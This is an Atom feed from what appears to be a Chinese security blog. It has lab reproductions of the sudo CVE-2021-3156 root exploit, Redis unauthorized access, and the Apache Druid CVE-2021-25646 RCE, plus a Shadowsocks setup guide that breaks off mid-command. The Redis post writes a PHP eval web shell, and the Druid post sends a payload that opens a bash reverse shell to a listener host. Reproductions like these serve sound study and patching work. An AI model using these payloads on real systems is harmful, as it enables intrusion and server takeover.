<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Blogs</title>
  
  
  <link href="https://administratorrs.github.io/atom.xml" rel="self"/>
  
  <link href="https://administratorrs.github.io/"/>
  <updated>2021-02-18T01:26:41.819Z</updated>
  <id>https://administratorrs.github.io/</id>
  
  <author>
    <name>Administratorrs</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Linux sudo CVE-2021-3156 提权漏洞复现</title>
    <link href="https://administratorrs.github.io/2021/02/17/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Linux%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/sudo/sudo%20%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/"/>
    <id>https://administratorrs.github.io/2021/02/17/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Linux%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/sudo/sudo%20%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-02-16T16:00:00.000Z</published>
    <updated>2021-02-18T01:26:41.819Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00  简介"></a>0x00  简介</h2><p>sudo是<a href="https://baike.baidu.com/item/linux%E7%B3%BB%E7%BB%9F/1732935">linux系统</a>管理指令，是允许<a href="https://baike.baidu.com/item/%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%91%98/1503845">系统管理员</a>让普通用户执行一些或者全部的root命令的一个工具，如halt，reboot，su等等。这样不仅减少了root用户的登录 和管理时间，同样也提高了安全性。sudo不是对shell的一个代替，它是面向每个命令的。</p><h2 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01  漏洞概述"></a>0x01  漏洞概述</h2><p>1月26日，Sudo发布安全通告，修复了一个类Unix操作系统在命令参数中转义反斜杠时存在基于堆的缓冲区溢出漏洞。当sudo通过-s或-i命令行选项在shell模式下运行命令时，它将在命令参数中使用反斜杠转义特殊字符。但使用-s或 -i标志运行sudoedit时，实际上并未进行转义，从而可能导致缓冲区溢出。只要存在sudoers文件（通常是 /etc/sudoers），攻击者就可以使用本地普通用户利用sudo获得系统root权限。请受影响的用户尽快采取措施进行防护。</p><h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02  影响版本"></a>0x02  影响版本</h2><p>Sudo 1.8.2 - 1.8.31p2</p><p>Sudo 1.9.0 - 1.9.5p1</p><h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03  环境搭建"></a>0x03  环境搭建</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#  获取环境</span><br><span class="line">sudo docker pull manishfoodtechs&#x2F;xfcefulldesktop_ubuntu20.4</span><br><span class="line">#  运行环境</span><br><span class="line">sudo docker run -it manishfoodtechs&#x2F;xfcefulldesktop_ubuntu20.4 &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure><h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04  漏洞利用"></a>0x04  漏洞利用</h2><p>新建测试用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">useradd test</span><br><span class="line">echo test:123 | chpasswd</span><br><span class="line">su test</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="/2021/02/17/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Linux%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/sudo/sudo%20%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/test_user.png"></p><p>查看 sudo 版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo --version</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="/2021/02/17/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Linux%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/sudo/sudo%20%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/sudo_version.png"></p><p>查看系统版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsb_release -a</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="/2021/02/17/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Linux%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/sudo/sudo%20%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/system_version.png"></p><p>找一个有写入权限的目录并下载运行 <a href="https://github.com/blasty/CVE-2021-3156">exp</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;tmp</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;blasty&#x2F;CVE-2021-3156.git</span><br><span class="line">cd CVE-2021-3156</span><br><span class="line">make</span><br><span class="line">chmod +x sudo-hax-me-a-sandwich</span><br><span class="line">.&#x2F;sudo-hax-me-a-sandwich 1</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="/2021/02/17/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Linux%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/sudo/sudo%20%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/exp.png"></p><p>查看 <a href="https://github.com/blasty/CVE-2021-3156">exp</a> 可用目标</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;sudo-hax-me-a-sandwich</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="/2021/02/17/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Linux%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/sudo/sudo%20%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/target.png"></p><h2 id="0x05-漏洞修复"><a href="#0x05-漏洞修复" class="headerlink" title="0x05  漏洞修复"></a>0x05  漏洞修复</h2><p>参考：<a href="http://blog.nsfocus.net/cve-2021-3156/">http://blog.nsfocus.net/cve-2021-3156/</a></p><h2 id="0x06-参考-URL"><a href="#0x06-参考-URL" class="headerlink" title="0x06 参考 URL"></a>0x06 参考 URL</h2><p><a href="https://www.cnblogs.com/Rain99-/p/14354452.html">https://www.cnblogs.com/Rain99-/p/14354452.html</a></p><p><a href="https://www.cnblogs.com/yujin2020/p/14377503.html">https://www.cnblogs.com/yujin2020/p/14377503.html</a></p><p><a href="https://blog.csdn.net/xuandao_ahfengren/article/details/113447282">https://blog.csdn.net/xuandao_ahfengren/article/details/113447282</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0x00-简介&quot;&gt;&lt;a href=&quot;#0x00-简介&quot; class=&quot;headerlink&quot; title=&quot;0x00  简介&quot;&gt;&lt;/a&gt;0x00  简介&lt;/h2&gt;&lt;p&gt;sudo是&lt;a href=&quot;https://baike.baidu.com/item/linux</summary>
      
    
    
    
    <category term="漏洞复现" scheme="https://administratorrs.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="漏洞复现" scheme="https://administratorrs.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="Linux 漏洞复现" scheme="https://administratorrs.github.io/tags/Linux-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>Redis 未授权访问漏洞复现</title>
    <link href="https://administratorrs.github.io/2021/02/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
    <id>https://administratorrs.github.io/2021/02/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</id>
    <published>2021-02-14T16:00:00.000Z</published>
    <updated>2021-02-17T06:21:44.805Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00  简介"></a>0x00  简介</h2><p>Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI <a href="https://baike.baidu.com/item/C%E8%AF%AD%E8%A8%80">C语言</a>编写、支持网络、可基于内存亦可持久化的日志型、Key-Value<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%BA%93/103728">数据库</a>，并提供多种语言的API。从2010年3月15日起，Redis的开发工作由VMware主持。从2013年5月开始，Redis的开发由<a href="https://baike.baidu.com/item/Pivotal">Pivotal</a>赞助。</p><h2 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01  漏洞概述"></a>0x01  漏洞概述</h2><p>Redis默认情况下，会绑定在0.0.0.0:6379，这样会将redis服务暴露在公网上，如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问redis以及读取redis的数据，攻击者在未授权访问redis的情况下可以利用redis的相关方法，进而成功在redis服务器上写入公钥，进而可以使用对应私钥直接登录目标服务器</p><h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02  影响版本"></a>0x02  影响版本</h2><p>Redis 2.x</p><p>Redis 3.x</p><p>Redis 4.x</p><p>Redis 5.x</p><h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03  环境搭建"></a>0x03  环境搭建</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#  安装 apache</span><br><span class="line">sudo apt-get install apache2</span><br><span class="line">sudo systemctl restart apache2</span><br><span class="line">#  下载 redis 并解压</span><br><span class="line">cd &#x2F;</span><br><span class="line">sudo wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-2.8.17.tar.gz</span><br><span class="line">sudo tar xzvf redis-2.8.17.tar.gz</span><br><span class="line">#  安装 make</span><br><span class="line">cd &#x2F;redis-2.8.17</span><br><span class="line">sudo make</span><br><span class="line">#  启动</span><br><span class="line">sudo &#x2F;redis-2.8.17&#x2F;src&#x2F;redis-server &#x2F;redis-2.8.17&#x2F;redis.conf</span><br></pre></td></tr></table></figure><h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04  漏洞利用"></a>0x04  漏洞利用</h2><p>1、使用 <a href="https://github.com/MicrosoftArchive/redis/releases">redis客户端工具</a> 进行连接（此处有未授权访问能直接连接）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli.exe -h 192.168.10.233</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="/2021/02/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/connect.png"></p><p>2、常用 redis 命令</p><p>redis 常用命令</p><p>详细命令：<a href="http://doc.redisfans.com/">http://doc.redisfans.com/</a></p><p>信息收集</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="/2021/02/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/info.png"></p><p>查看连接设置的名字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">client getname</span><br></pre></td></tr></table></figure><p>新建默认没有名字如下</p><p><img src= "/img/loading.gif" data-lazy-src="/2021/02/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/getname.png"></p><p>查看数据库中的键值对</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keys *</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="/2021/02/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/keys.png"></p><p>删除键</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">del key 删除键为key的数据</span><br></pre></td></tr></table></figure><h3 id="写入-WebShell"><a href="#写入-WebShell" class="headerlink" title="写入 WebShell"></a>写入 WebShell</h3><p>需求：</p><ul><li><p>1、redis 未授权 能 redis-cli 连上</p></li><li><p>2、开了 web 并且知道路径</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">config set dbfilename redis.php</span><br><span class="line">set webshell &quot;&lt;?php echo @eval($_POST[&#39;pass&#39;]); ?&gt;&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>使用蚁剑连接</p><p><img src= "/img/loading.gif" data-lazy-src="/2021/02/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/webshell-1.png"></p><p><img src= "/img/loading.gif" data-lazy-src="/2021/02/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/webshell-2.png"></p><h2 id="0x05-漏洞修复"><a href="#0x05-漏洞修复" class="headerlink" title="0x05  漏洞修复"></a>0x05  漏洞修复</h2><p>参考：<a href="https://www.cnblogs.com/xun0523/p/9804999.html">https://www.cnblogs.com/xun0523/p/9804999.html</a></p><h2 id="0x06-参考-URL"><a href="#0x06-参考-URL" class="headerlink" title="0x06 参考 URL"></a>0x06 参考 URL</h2><p><a href="https://www.cnblogs.com/cl0ud/p/13873085.html">https://www.cnblogs.com/cl0ud/p/13873085.html</a></p><p><a href="https://www.cnblogs.com/bmjoker/p/9548962.html">https://www.cnblogs.com/bmjoker/p/9548962.html</a></p><p><a href="https://www.secpulse.com/archives/5357.html">https://www.secpulse.com/archives/5357.html</a></p><p><a href="https://www.cnblogs.com/-qing-/p/10978912.htm">https://www.cnblogs.com/-qing-/p/10978912.htm</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0x00-简介&quot;&gt;&lt;a href=&quot;#0x00-简介&quot; class=&quot;headerlink&quot; title=&quot;0x00  简介&quot;&gt;&lt;/a&gt;0x00  简介&lt;/h2&gt;&lt;p&gt;Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使</summary>
      
    
    
    
    <category term="漏洞复现" scheme="https://administratorrs.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="漏洞复现" scheme="https://administratorrs.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="Redis 漏洞复现" scheme="https://administratorrs.github.io/tags/Redis-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>Apache Druid CVE-2021-25646 RCE 漏洞复现</title>
    <link href="https://administratorrs.github.io/2021/02/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Druid%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2021-25646/"/>
    <id>https://administratorrs.github.io/2021/02/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Druid%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2021-25646/</id>
    <published>2021-02-14T16:00:00.000Z</published>
    <updated>2021-02-17T06:21:11.294Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00  简介"></a>0x00  简介</h2><p>Druid 是一个分布式的、支持实时多维 OLAP 分析的数据处理系统。它既支持高速的数据实时摄入处理，也支持实时且灵活的多维数据分析查询。因此 Druid 最常用的场景就是大数据背景下、灵活快速的多维 OLAP 分析。 另外，Druid 还有一个关键的特点：它支持根据时间戳对数据进行预聚合摄入和聚合分析，因此也有用户经常在有时序数据处理分析的场景中用到它。</p><h2 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01  漏洞概述"></a>0x01  漏洞概述</h2><p>Apache Druid 是用Java编写的面向列的开源分布式数据存储，旨在快速获取大量事件数据，并在数据之上提供低延迟查询。<br>Apache Druid 默认情况下缺乏授权认证，攻击者可以发送特制请求，利用Druid服务器上进程的特权执行任意代码。</p><h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02  影响版本"></a>0x02  影响版本</h2><p>Apache Druid &lt; 0.20.1</p><h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03  环境搭建"></a>0x03  环境搭建</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#  获取 druid 镜像</span><br><span class="line">sudo docker pull fokkodriesprong&#x2F;docker-druid</span><br><span class="line">#  重启 docker</span><br><span class="line">sudo systemctl restart docker</span><br><span class="line">#  启动 druid 环境</span><br><span class="line">sudo docker run -d -p 8888:8888 fokkodriesprong&#x2F;docker-druid</span><br><span class="line">#  查看环境</span><br><span class="line">sudo docker ps</span><br><span class="line">#  进入环境目录（目录名为启动 shrio 环境时返回的名字（或用查看环境的命令查看））</span><br><span class="line">sudo docker exec -it 268f542b6482 bash</span><br></pre></td></tr></table></figure><h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04  漏洞利用"></a>0x04  漏洞利用</h2><p>1、Win10 监听 9999 端口</p><p><img src= "/img/loading.gif" data-lazy-src="/2021/02/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Druid%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2021-25646/nc-1.png"></p><p>2、访问 <code>http://192.168.10.233:8888/unified-console.html</code> 并单击 <code>Load data</code></p><p><img src= "/img/loading.gif" data-lazy-src="/2021/02/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Druid%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2021-25646/web-1.png"></p><p>3、在 <code>Base directory</code> 跟 <code>File filter</code> 处分别填入如下内容，然后单击 <code>Next: Parse data</code> 并抓包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">quickstart&#x2F;tutorial&#x2F;</span><br><span class="line">wikiticker-2015-09-12-sampled.json.gz</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="/2021/02/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Druid%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2021-25646/web-2.png"></p><p>4、使用 BP 抓包后构建poc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;type&quot;:&quot;index&quot;,&quot;spec&quot;:&#123;&quot;ioConfig&quot;:&#123;&quot;type&quot;:&quot;index&quot;,&quot;firehose&quot;:&#123;&quot;type&quot;:&quot;local&quot;,&quot;baseDir&quot;:&quot;quickstart&#x2F;tutorial&#x2F;&quot;,&quot;filter&quot;:&quot;wikiticker-2015-09-12-sampled.json.gz&quot;&#125;&#125;,&quot;dataSchema&quot;:&#123;&quot;dataSource&quot;:&quot;sample&quot;,&quot;parser&quot;:&#123;&quot;type&quot;:&quot;string&quot;,&quot;parseSpec&quot;:&#123;&quot;format&quot;:&quot;json&quot;,&quot;timestampSpec&quot;:&#123;&quot;column&quot;:&quot;time&quot;,&quot;format&quot;:&quot;iso&quot;&#125;,&quot;dimensionsSpec&quot;:&#123;&#125;&#125;&#125;,&quot;transformSpec&quot;:&#123;&quot;transforms&quot;:[],&quot;filter&quot;:&#123;&quot;type&quot;:&quot;javascript&quot;,</span><br><span class="line"> </span><br><span class="line">&quot;function&quot;:&quot;function(value)&#123;return java.lang.Runtime.getRuntime().exec(&#39;&#x2F;bin&#x2F;bash -c $@|bash 0 echo bash -i &gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;192.168.10.114&#x2F;9999 0&gt;&amp;1&#39;)&#125;&quot;,</span><br><span class="line"> </span><br><span class="line">&quot;dimension&quot;:&quot;added&quot;,</span><br><span class="line"> </span><br><span class="line">&quot;&quot;:&#123;</span><br><span class="line"> </span><br><span class="line">&quot;enabled&quot;:&quot;true&quot;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">&#125;&#125;&#125;&#125;,&quot;samplerConfig&quot;:&#123;&quot;numRows&quot;:500,&quot;cacheKey&quot;:&quot;79a5be988bf94d42a6f219b63ff27383&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="/2021/02/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Druid%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2021-25646/bp.png"></p><p>5、此时 Win10 已收到反弹的shell</p><p><img src= "/img/loading.gif" data-lazy-src="/2021/02/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Druid%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2021-25646/nc-2.png"></p><h2 id="0x05-漏洞修复"><a href="#0x05-漏洞修复" class="headerlink" title="0x05  漏洞修复"></a>0x05  漏洞修复</h2><p>升级到最新版本</p><h2 id="0x06-参考-URL"><a href="#0x06-参考-URL" class="headerlink" title="0x06 参考 URL"></a>0x06 参考 URL</h2><p><a href="https://blog.csdn.net/xuandao_ahfengren/article/details/113573652">https://blog.csdn.net/xuandao_ahfengren/article/details/113573652</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0x00-简介&quot;&gt;&lt;a href=&quot;#0x00-简介&quot; class=&quot;headerlink&quot; title=&quot;0x00  简介&quot;&gt;&lt;/a&gt;0x00  简介&lt;/h2&gt;&lt;p&gt;Druid 是一个分布式的、支持实时多维 OLAP 分析的数据处理系统。它既支持高速的数据实时摄</summary>
      
    
    
    
    <category term="漏洞复现" scheme="https://administratorrs.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="漏洞复现" scheme="https://administratorrs.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="Apache Druid 漏洞复现" scheme="https://administratorrs.github.io/tags/Apache-Druid-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu配置 Shadowsocks</title>
    <link href="https://administratorrs.github.io/2021/02/11/%E4%BB%A3%E7%90%86/Shadowsocks/Shadowsocks/"/>
    <id>https://administratorrs.github.io/2021/02/11/%E4%BB%A3%E7%90%86/Shadowsocks/Shadowsocks/</id>
    <published>2021-02-10T16:00:00.000Z</published>
    <updated>2021-02-11T04:24:01.375Z</updated>
    
    <content type="html"><![CDATA[<h2 id="安装所需包"><a href="#安装所需包" class="headerlink" title="安装所需包"></a>安装所需包</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#  更新本地已安装软件</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get upgrade -y</span><br><span class="line"></span><br><span class="line">#  安装 python-pip、Shadowsocks</span><br><span class="line">sudo apt-get install python3-pip -y</span><br><span class="line">pip3 install https:&#x2F;&#x2F;github.com&#x2F;shadowsocks&#x2F;shadowsocks&#x2F;archive&#x2F;master.zip</span><br><span class="line">sudo apt-get install shadowsocks</span><br><span class="line"></span><br><span class="line">#  查看 Shadowsocks 版本</span><br><span class="line">sudo ssserver --version</span><br><span class="line"></span><br><span class="line">#  修改 Shadowsocks 相关文件权限，并备份配置文件</span><br><span class="line">sudo chmod 557 &#x2F;var&#x2F;run&#x2F;shadowsocks.pid</span><br><span class="line">sudo chmod 557 &#x2F;var&#x2F;log&#x2F;shadowsocks.log</span><br><span class="line">sudo cp -p &#x2F;etc&#x2F;shadowsocks&#x2F;config.json &#x2F;etc&#x2F;shadowsocks&#x2F;config.json.bak</span><br></pre></td></tr></table></figure><h2 id="编辑配置文件"><a href="#编辑配置文件" class="headerlink" title="编辑配置文件"></a>编辑配置文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">    &#123;</span><br><span class="line">    &quot;server&quot;:&quot;0.0.0.0&quot;,             #  监听地址（不能更改，否则无法访问）</span><br><span class="line">    &quot;server_port&quot;:1234,             #  服务器端口（访问时使用的端口）</span><br><span class="line">    &quot;local_address&quot;: &quot;127.0.0.1&quot;,   #  本地地址</span><br><span class="line">    &quot;local_port&quot;:1080,              #  本地端口</span><br><span class="line">    &quot;password&quot;:&quot;123&quot;,               #  密码（须更改原密码后才能启动服务）</span><br><span class="line">    &quot;timeout&quot;:300,                  #  超时时间</span><br><span class="line">    &quot;method&quot;:&quot;aes-256-cfb&quot;,         #  加密方式</span><br><span class="line">    &quot;fast_open&quot;: false,             #  是否启用 TCP-Fast-Open</span><br><span class="line">    &quot;workers&quot;: 1,                   #  workers 数量</span><br><span class="line">    &quot;prefer_ipv6&quot;: false</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>修改完配置文件后启动服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 启动服务</span><br><span class="line">sudo ssserver -c 